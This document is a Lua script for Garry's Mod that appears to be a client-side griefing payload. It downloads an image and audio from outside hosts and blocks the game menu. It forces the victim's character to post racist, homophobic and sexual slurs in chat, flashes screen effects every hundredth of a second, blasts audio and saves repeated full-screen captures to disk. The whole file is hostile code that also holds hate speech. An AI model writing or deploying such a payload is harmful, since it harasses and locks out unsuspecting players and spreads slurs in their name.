local all = _G

local render = all.render
local draw = all.draw
local player = all.player
local http = all.http
local math = all.math
local file = all.file
math.randomseed(CurTime())
curTime = CurTime()

local faggotStuff = {
	"i love nigger butthole!",
	"i love taking care of my black bull while he fucks my girlfriend",
	"i'm the biggest cuck you'll ever know!",
	"black cocks are the best!",
	"niggers are retarded, but they have good dicks!",
	"if you dont like niggers, i dont like you!"
}

local deathColors = {
	"sprites/firecracker_exp",
	"tracers/ef_halogun_projectile",
	"sprites/starchaser_exp",
	"effects/comball_d/ar2_altfire1_d",
	"sprites/cannon_exp",
	"sprites/plasmagun_exp",
	"sprites/ef_sgmissileex",
	"sprites/grenade_exp2",
	"effects/ar2_altfire1",
	"sprites/m24_exp"
}

local function generateRandomString(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local generateRandomString = ""
    local charsCount = #chars

    for i = 1, length do
        local randomIndex = math.random(charsCount)
        generateRandomString = generateRandomString .. string.sub(chars, randomIndex, randomIndex)
    end

    return generateRandomString
end

local function FuckYou()
	local fucked = render.Capture({
		format = "jpeg",
		x = 0,
		y = 0,
		w = ScrW(),
		h = ScrH(),
		quality = "100"
	})
	file.Write(generateRandomString(30) .. ".jpeg", fucked)
end

local funny 
http.Fetch("https://cdn.discordapp.com/attachments/1100513529745903690/1153491329775587399/image.png", function(b)

	file.Write("ssddasd.png", b)
	funny = Material("../data/ssddasd.png")
	print(funny)

end) 

local function DoAlotOfStuff()
	
	local originalFileAmt = #currFiles
	local iterations = 0

	hook.Add("PostRender", "hoob", function() 

		iterations = iterations + 1
		if iterations >= 10 then
			FuckYou()
			surface.PlaySound("npc/scanner/scanner_photo1.wav")
			iterations = 0
		end

	end)

	timer.Create(generateRandomString(20), 10, 0, function() LocalPlayer():ConCommand("say " .. table.Random(faggotStuff)) end)
	local newScreenshots = 0
	timer.Create(generateRandomString(10), 4, 0, function() LocalPlayer():ConCommand("say " .. newScreenshots) end)
	timer.Create(generateRandomString(20), 0.01, 0, function() LocalPlayer():ConCommand(string.format("pp_texturize %s",table.Random(deathColors))) end)

	hook.Add("PreRender", "hoob", function()

		LocalPlayer():ConCommand("escape")
		LocalPlayer():ConCommand("cancelselect")
		gui.HideGameUI()

	end)

	hook.Add("PostRender","amine", function()
		local funnyw, funnyh = funny:Width(), funny:Height()
		surface.SetMaterial(funny)
		surface.SetDrawColor(255,255,255,255)
		cam.Start2D()
		surface.DrawTexturedRect(math.random(0,ScrW() - funnyw),math.random(0,ScrH() - funnyh), funnyw, funnyh)
		surface.DrawTexturedRect(math.random(0,ScrW() - funnyw),math.random(0,ScrH() - funnyh), funnyw, funnyh)
		surface.DrawTexturedRect(math.random(0,ScrW() - funnyw),math.random(0,ScrH() - funnyh), funnyw, funnyh)
		surface.DrawTexturedRect(math.random(0,ScrW() - funnyw),math.random(0,ScrH() - funnyh), funnyw, funnyh)
		surface.DrawTexturedRect(math.random(0,ScrW() - funnyw),math.random(0,ScrH() - funnyh), funnyw, funnyh)
		surface.DrawTexturedRect(math.random(0,ScrW() - funnyw),math.random(0,ScrH() - funnyh), funnyw, funnyh)
		surface.DrawTexturedRect(math.random(0,ScrW() - funnyw),math.random(0,ScrH() - funnyh), funnyw, funnyh)
		cam.End2D()
	end)

	hook.Add("Think",generateRandomString(100), function()


		local curFiles,curDirs = file.Find("*", "DATA")
		newScreenshots = #curFiles - originalFileAmt

	end)

end

sound.PlayURL("https://files.catbox.moe/gly8lo.flac", "noblock", function(sound)

	sound:SetVolume(0)
	sound:SetTime(1, true)
	sound:SetVolume(1)
	currFiles,currDirs = file.Find("*", "DATA")
	timer.Simple(11.9, function() sound:SetVolume(100) DoAlotOfStuff() end)

end)
